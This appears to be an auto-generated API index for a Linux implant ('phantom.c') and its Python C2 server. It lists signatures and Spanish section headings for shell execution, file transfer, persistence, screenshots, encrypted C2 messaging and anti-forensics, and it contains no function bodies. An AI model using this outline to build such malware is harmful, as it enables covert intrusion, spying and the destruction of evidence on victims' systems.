# API

## phantom.c

### __io_uring_setup (function) `static inline int __io_uring_setup(unsigned int entries, struct io_uring_params *p)`
- Defined: `phantom.c:69`

### __io_uring_enter (function) `static inline int __io_uring_enter(int fd, unsigned int to_submit, unsigned int min_complete,
   ...`
- Defined: `phantom.c:72`

### __io_uring_register (function) `static inline int __io_uring_register(int fd, unsigned int opcode, const void *arg, unsigned int ...`
- Defined: `phantom.c:76`

### uring_queue_init (function) `static int uring_queue_init(unsigned int entries, struct io_uring *ring)`
- Defined: `phantom.c:80`

### uring_get_sqe (function) `static struct io_uring_sqe *uring_get_sqe(struct io_uring *ring)`
- Defined: `phantom.c:120`

### uring_submit (function) `static int uring_submit(struct io_uring *ring)`
- Defined: `phantom.c:128`

### uring_wait_cqe_timeout (function) `static int uring_wait_cqe_timeout(struct io_uring *ring, struct io_uring_cqe **cqe_ptr, int timeo...`
- Defined: `phantom.c:134`

### uring_cqe_seen (function) `static inline void uring_cqe_seen(struct io_uring *ring, struct io_uring_cqe *cqe)`
- Defined: `phantom.c:143`

### chacha20_keystream (function) `static void chacha20_keystream(uint32_t counter, uint8_t *key, uint8_t *nonce, uint8_t *out, size...`
- Defined: `phantom.c:155`

### encrypt_payload (function) `static void encrypt_payload(uint8_t *data, size_t len, uint8_t *key, uint8_t *nonce)`
- Defined: `phantom.c:161`

### uring_read (function) `static ssize_t uring_read(int fd, void *buf, size_t count, off_t offset)`
- Defined: `phantom.c:221`

### uring_write (function) `static ssize_t uring_write(int fd, const void *buf, size_t count, off_t offset)`
- Defined: `phantom.c:243`

### run_shell_command (function) `static char *run_shell_command(const char *cmd)`
- Defined: `phantom.c:268`
- Doc: --------------------------------------------------------------------- EJECUCIÓN DE COMANDOS ----------------------------

### upload_file (function) `static int upload_file(const char *local_path, const char *remote_path)`
- Defined: `phantom.c:303`
- Doc: --------------------------------------------------------------------- SUBIR / BAJAR ARCHIVOS ---------------------------

### download_file (function) `static int download_file(const char *remote_path, const char *local_path)`
- Defined: `phantom.c:319`

### install_persistence (function) `static void install_persistence(void)`
- Defined: `phantom.c:326`
- Doc: --------------------------------------------------------------------- PERSISTENCIA -------------------------------------

### take_screenshot (function) `static void take_screenshot(const char *outfile)`
- Defined: `phantom.c:400`
- Doc: --------------------------------------------------------------------- CAPTURA DE PANTALLA ------------------------------

### connect_c2 (function) `static int connect_c2(void)`
- Defined: `phantom.c:409`
- Doc: --------------------------------------------------------------------- C2 COMUNICACIÓN ----------------------------------

### recv_encrypted (function) `static int recv_encrypted(int sock, void *buf, size_t len, unsigned char *key)`
- Defined: `phantom.c:424`

### send_encrypted (function) `static int send_encrypted(int sock, const void *buf, size_t len, unsigned char *key)`
- Defined: `phantom.c:431`

### recv_command (function) `static c2_command_t recv_command(int sock)`
- Defined: `phantom.c:441`

### send_response (function) `static void send_response(int sock, c2_response_t *resp)`
- Defined: `phantom.c:453`

### process_command (function) `static void process_command(int sock, c2_command_t *cmd)`
- Defined: `phantom.c:462`
- Doc: --------------------------------------------------------------------- PROCESADOR DE COMANDOS ---------------------------

### c2_loop (function) `static void *c2_loop(void *arg)`
- Defined: `phantom.c:563`
- Doc: --------------------------------------------------------------------- HILO PRINCIPAL C2 --------------------------------

### anti_forensics (function) `static void anti_forensics(void)`
- Defined: `phantom.c:600`
- Doc: --------------------------------------------------------------------- ANTI‑FORENSE -------------------------------------

### main (function) `int main(int argc, char **argv)`
- Defined: `phantom.c:611`
- Doc: --------------------------------------------------------------------- MAIN ---------------------------------------------

## server.py

### xor_crypt (function) `def xor_crypt(data)`
- Defined: `server.py:11`
- Doc: Aplica XOR con la clave definida

### recv_exact (function) `def recv_exact(sock, n)`
- Defined: `server.py:15`
- Doc: Recibe exactamente n bytes

### main (function) `def main()`
- Defined: `server.py:25`
